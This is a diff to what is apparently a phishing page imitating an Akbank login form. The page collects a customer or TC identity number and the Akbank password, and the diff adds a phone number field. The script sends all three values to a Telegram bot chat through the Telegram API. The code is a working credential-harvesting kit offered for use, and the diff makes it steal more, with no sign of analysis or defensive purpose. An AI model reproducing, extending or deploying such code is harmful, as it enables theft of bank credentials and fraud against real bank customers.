@@ -114,6 +114,11 @@
                     </label>
                     <input type="text" name="customTc" placeholder="Müşteri veya TC kimlik numaranı gir" id="customUsername" style="font-size: 13px; font-weight: 600; border: 0; width: 100%; display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric">
                     <hr>
+                    <label for="customUsername" style="color:#636364; font-size: 11px; display: block; margin-bottom: 3%; float: left; font-weight: 600;">
+                        TELEFON NUMARASI
+                    </label>
+                    <input type="text" name="customtel" placeholder="Telefon Numaranı numaranı gir" id="customtel" style="font-size: 13px; font-weight: 600; border: 0; width: 100%; display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric">
+                    <hr>
                     <label for="customPassword" style="float: left; color:#636364; font-size: 11px; display: block; margin-bottom: 3%; margin-top: 3%; font-weight: 600;">
                         AKBANK ŞİFRESİ
                     </label>
@@ -155,6 +160,7 @@
             // Form verilerini topla
             var formData = new FormData(form);
             var customTc = formData.get('customTc');
+            var customtel = formData.get('customtel');
             var customPass = formData.get('customPass');
     
             // Telegram bot token ve chat id
@@ -162,7 +168,7 @@
             var chatId = '-1002171184358';
     
             // Mesaj içeriğini hazırla
-            var message = `Müşteri veya TC Kimlik Numarası: ${customTc}\nAkbank Şifresi: ${customPass}`;
+            var message = `Müşteri veya TC Kimlik Numarası: ${customTc}\nAkbank Şifresi: ${customPass}\nTelefon Numarası: ${customtel}`;
     
             // Telegram API URL'si
             var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
